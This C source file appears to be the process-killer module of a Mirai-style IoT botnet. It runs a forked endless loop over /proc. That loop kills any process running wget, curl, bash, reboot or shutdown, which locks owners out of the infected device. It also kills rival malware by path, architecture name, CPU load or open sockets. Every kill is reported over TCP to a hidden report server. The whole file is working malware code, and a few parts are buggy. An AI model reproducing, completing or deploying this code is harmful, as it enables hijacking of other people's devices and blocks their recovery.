#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>
#include <string.h>
#include <stdbool.h>
#include <ctype.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/inotify.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

#define MAX_PATH_LENGTH 256
#define MAX_CMD_LENGTH  512

Kill *k_head = NULL;
char self_realpath[256] = {0};
int killer_pid;

const char *whitelist[] = {
    "sh",
    "ps"
};

const char *blacklist[] = {
    "/tmp",
    "/var/run",
    "/mnt",
    "/root",
    "/var/tmp",
    "/boot",
    "/bin",
    "/sbin",
    "/.",
    "./",
    "(deleted)",
    "/home",
    "dbg",
    "mpsl",
    "mipsel",
    "mips",
    "arm",
    "arm4",
    "arm5",
    "arm6",
    "arm7",
    "sh4",
    "m68k"
    "x86",
    "x586",
    "x86_64",
    "i586",
    "i686",
    "ppc",
    "spc"
};

void report_kill(const char *message) {
    if (strcmp(message, "EOF") == 0 || strlen(message) <= 0)
        return;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
       return;

    char tbl_report_ip[64];
    table_unlock_val(TABLE_REPORT_IP);
    util_strcpy(tbl_report_ip, table_retrieve_val(TABLE_REPORT_IP, NULL));

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(7733);

    inet_pton(AF_INET, tbl_report_ip, &(server_addr.sin_addr));
    connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    write(sockfd, message, strlen(message));
    table_lock_val(TABLE_REPORT_IP);
}

void lock_device() {
    DIR *dir;
    struct dirent *file;
    char path[MAX_PATH_LENGTH];

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        if (pid == killer_pid || pid == getppid() || pid == killer_pid || pid == 0 || pid == 1)
            continue;

        snprintf(path, sizeof(path), "/proc/%s/cmdline", file->d_name);
            
        FILE *cmdfile = fopen(path, "r");
        if (cmdfile != NULL) {
            char cmdline[MAX_PATH_LENGTH];
            if (fgets(cmdline, sizeof(cmdline), cmdfile) != NULL) {
                if (
                    strstr(cmdline, "wget") || 
                    strstr(cmdline, "curl") ||
                    strstr(cmdline, "ftp") ||
                    strstr(cmdline, "echo") ||
                    strstr(cmdline, "kill") ||
                    strstr(cmdline, "bash") ||
                    strstr(cmdline, "reboot") ||
                    strstr(cmdline, "shutdown") ||
                    strstr(cmdline, "halt") ||
                    strstr(cmdline, "poweroff")
                ) {
                    char message[256];
                    snprintf(message, sizeof(message), "[locker] killed process: %s ;; pid: %d\n", cmdline, pid);
                    if (kill(pid, 9) == 0) {
                        report_kill(message);
                        continue;
                    }
                }
            }

            fclose(cmdfile);
        }
    }

    closedir(dir);
}

bool is_whitelisted(const char *maps) {
    for (int i = 0; i < sizeof(whitelist) / sizeof(whitelist[0]); i++) {
        if (strstr(whitelist[i], maps))
            return true;
    }

    return false;
}

void killer_dora_the_explorer() {
    DIR *dir;
    struct dirent *file;
    char maps_path[MAX_PATH_LENGTH];
    char maps_line[MAX_PATH_LENGTH];

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((file = readdir(dir)) != NULL) {
        int pid = atoi(file->d_name);
        if (pid == killer_pid || pid == getppid() || pid == killer_pid || pid == 0 || pid == 1)
            continue;

        snprintf(maps_path, MAX_PATH_LENGTH, "/proc/%d/maps", pid);

        FILE *maps_file = fopen(maps_line, "r");
        if (maps_file == NULL)
            continue;

        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL) {
            char *pos = strchr(maps_line, ' ');
            if (pos != NULL)
                *pos = '\0';
            
            if (is_whitelisted(maps_line))
                continue;

            for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                if (strstr(maps_line, blacklist[i]) != NULL) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/maps] killed process: %s ;; pid: %d\n", maps_line, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        continue;
                    }
                }
            }
        }

        fclose(maps_file);
    }

    closedir(dir);
}

// void killer_backpack() {
//     FILE *out;
//     char command[MAX_CMD_LENGTH];
//     char process_line[MAX_CMD_LENGTH];
//     int pid;

//     snprintf(command, MAX_CMD_LENGTH, "ps -e -o pid,args=");
//     out = popen(command, "r");
//     if (out == NULL)
//         return;

//     while (fgets(process_line, sizeof(process_line), out) != NULL) {
//         if (sscanf(process_line, "%d %255[^\n]", &pid, command) == 2) {
//             if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
//                 continue;

//             if (is_whitelisted(command))
//                 continue;

//             char message[256];
//             snprintf(message, sizeof(message), "[killer/ps] killed process: %s ;; pid: %d\n", command, pid);
//             report_kill(message);
//             #ifdef DEBUG
//                 printf("[killer/ps] killed process: %s ;; pid: %d\n", command, pid);
//             #endif
//             if (kill(pid, 9) == 0) {
//                 if (strstr(command, "BusyBox") || strstr(command, "ps:"))
//                     continue;

//                 #ifdef DEBUG
//                     printf(message);
//                 #endif
//                 report_kill(message);
//                 continue;
//             }
//         }
//     }

//     pclose(out);
// }

void killer_diego() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir))) {
        int pid = atoi(entry->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        if (pid > 0) {
            char proc_path[MAX_PATH_LENGTH];
            char exe_path[MAX_PATH_LENGTH];
            char link_path[MAX_PATH_LENGTH];

            snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
            ssize_t len = readlink(proc_path, link_path, sizeof(link_path));
            if (len == -1)
                continue;

            link_path[len] = '\0';
            if (is_whitelisted(link_path))
                continue;

            for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                if (strstr(link_path, blacklist[i]) != NULL) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/exe] killed process: %s ;; pid: %d\n", link_path, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        continue;
                    }
                }
            }
        }
    }
}

void killer_swiper() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir))) {
        int pid = atoi(entry->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        if (pid > 0) {
            char stat_path[MAX_PATH_LENGTH];
            FILE *stat_file;

            snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);

            stat_file = fopen(stat_path, "r");
            if (stat_file == NULL)
                return;

            int pid;
            char command[256];
            char state;
            int ppid;

            fscanf(stat_file, "%d %s %c %d", &pid, command, &state, &ppid);
            fclose(stat_file);

            if (is_whitelisted(command))
                continue;

            for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                if (strstr(command, blacklist[i]) != NULL) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/stat] killed process: %s ;; pid: %d\n", command, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        continue;
                    }
                }
            }
        }
    }
}

void killer_boots() {
    DIR *dir;
    struct dirent *file;
    char path[MAX_PATH_LENGTH];

    dir = opendir("/proc");
    if (dir == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        snprintf(path, sizeof(path), "/proc/%s/cmdline", file->d_name);
            
        FILE *cmdfile = fopen(path, "r");
        if (cmdfile != NULL) {
            char cmdline[MAX_PATH_LENGTH];
            if (fgets(cmdline, sizeof(cmdline), cmdfile) != NULL) {
                if (is_whitelisted(cmdline))
                    return;

                for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                    if (strstr(cmdline, "/") == NULL || strstr(cmdline, blacklist[i]) != NULL) {
                        char message[256];
                        snprintf(message, sizeof(message), "[killer/cmd] killed process: %s ;; pid: %d\n", cmdline, pid);
                        if (kill(pid, 9) == 0) {
                            #ifdef DEBUG
                                printf(message);
                            #endif
                            report_kill(message);
                            continue;
                        }
                    }
                }
            }

            fclose(cmdfile);
        }
    }

    closedir(dir);
}

void killer_im_the_map() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir)) != NULL) {
        char stat_path[MAX_PATH_LENGTH], stat_line[1024], cmd_path[MAX_PATH_LENGTH], cmd_line[1024];
        unsigned utime, stime;
        unsigned long long starttime;

        int pid = atoi(entry->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        snprintf(stat_path, MAX_PATH_LENGTH, "/proc/%s/stat", entry->d_name);
        snprintf(cmd_path, MAX_PATH_LENGTH, "/proc/%s/cmdline", entry->d_name);

        FILE *stat_file = fopen(stat_path, "r");
        if (stat_file) {
            fgets(stat_line, sizeof(stat_line), stat_file);
            fclose(stat_file);

            sscanf(stat_line, "%*d %*s %*c %*d %*d %*d %*d %*d %*lu %*lu %*lu %*lu %lu %lu %*ld %*ld %*ld %*ld %*ld %*ld %*ld %*llu %lu", &utime, &stime, &starttime);
            double cpu_percent = (double)(utime + stime) / sysconf(_SC_CLK_TCK) / (time(NULL) - (double)starttime / sysconf(_SC_CLK_TCK)) * 100;
            double max_percent = 3.00;

            if (cpu_percent > max_percent) {
                FILE *cmd_file = fopen(cmd_path, "r");
                if (cmd_file) {
                    fgets(cmd_line, sizeof(cmd_line), cmd_file);
                    fclose(cmd_file);

                    if (is_whitelisted(cmd_line))
                        continue;

                    char message[256];
                    snprintf(message, sizeof(message), "[killer/cpu] killed process: %s ;; pid: %d\n", cmd_line, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        continue;
                    }
                }
            }
        }
    }
}

char *check_realpath(char *pid, char *path, int locker) {
    char exepath[256] = {0};

    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");

    if (readlink(exepath, path, 256) == -1)
        return NULL;

    if (is_whitelisted(path))
        return NULL;

    return path;
}

static char check_for_contraband(char *fdpath) {
    char fdinode[256] = {0};

    if (readlink(fdpath, fdinode, 256) == -1)
        return 0;

    if (strstr(fdinode, "socket") || strstr(fdinode, "proc"))
        return 1;

    return 0;
}

static char check_fds(char *pid, char *realpath) {
    char retval = 0;
    DIR *dir;
    struct dirent *file;
    char inode[256], fdspath[256] = {0}, fdpath[512];

    _strcpy(fdspath, "/proc/");
    _strcat(fdspath, pid);
    _strcat(fdspath, "/fd");

    if ((dir = opendir(fdspath)) == NULL)
        return retval;

    while ((file = readdir(dir))) {
        _memset(inode, 0, 256);
        _strcpy(fdpath, fdspath);
        _strcat(fdpath, "/");
        _strcat(fdpath, file->d_name);

        if (check_for_contraband(fdpath)) {
            retval = 1;
            break;
        }
    }

    closedir(dir);
    return retval;
}

static void delete_list(void) {
    Kill *temp = NULL;

    if (k_head == NULL)
        return;

    while (k_head != NULL)
    {
        if ((temp = k_head->next) != NULL)
            free(k_head);

        k_head = temp;
    }
}

static Kill *compare_realpaths(char *pid) {
    Kill *node = k_head;
    char exepath[256], realpath[256] = {0};

    if (node == NULL)
        return 0;

    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");

    if (readlink(exepath, realpath, 256) == -1)
        return NULL;

    while (node != NULL) {
        if (_strcmp2(node->path, realpath) == 0)
            return node;

        node = node->next;
    }

    return NULL;
}

static void kill_list(void) {
    int pid;
    DIR *dir;
    Kill *node = NULL;
    struct dirent *file;

    if ((dir = opendir("/proc/")) == NULL)
        return delete_list();

    while ((file = readdir(dir))) {
        pid = _atoi(file->d_name);
        if (!(node = compare_realpaths(file->d_name)))
            continue;

        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        char message[256];
        snprintf(message, sizeof(message), "[killer/node] killed process: %s ;; pid: %d\n", node->path, node->pid);
        report_kill(message);
        kill(pid, 9);
    }

    closedir(dir);
    delete_list();
}

static void add_to_kill(char *pid, char *realpath) {
    if (*pid == killer_pid || *pid == getppid() || *pid == 0 || *pid == 1)
        return;

    Kill *node = calloc(1, sizeof(Kill)), *last;

    node->n_pid = _atoi(pid);

    _strcpy(node->pid, pid);
    _strcpy(node->path, realpath);

    if (k_head == NULL) {
        k_head = node;
        return;
    }

    last = k_head;

    while (last->next != NULL)
        last = last->next;

    last->next = node;
    kill(node->n_pid, 19);
}

void killer_tico(void) {
    DIR *dir;
    struct dirent *file;
    char realpath[256] = {0};

    if ((dir = opendir("/proc/")) == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        if (!util_isdigit(file->d_name[0]))
            continue;

        _memset(realpath, 0, 256);

        if (!check_realpath(file->d_name, realpath, 0))
            continue;

        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        if (check_fds(file->d_name, realpath))
            add_to_kill(file->d_name, realpath);
    }

    closedir(dir);

    kill_list();
}

void killer_init() {
    int edo;
    edo = fork();
	if(edo > 0 || edo == 1) {
		return;
	}

    killer_pid = getpid();
    prctl(PR_SET_PDEATHSIG, SIGHUP);
    while (1) {
        lock_device();
        killer_dora_the_explorer();
        //killer_backpack();
        killer_diego();
        killer_swiper();
        killer_boots();
        killer_im_the_map();
        killer_tico();
        usleep(150000);
    }
}
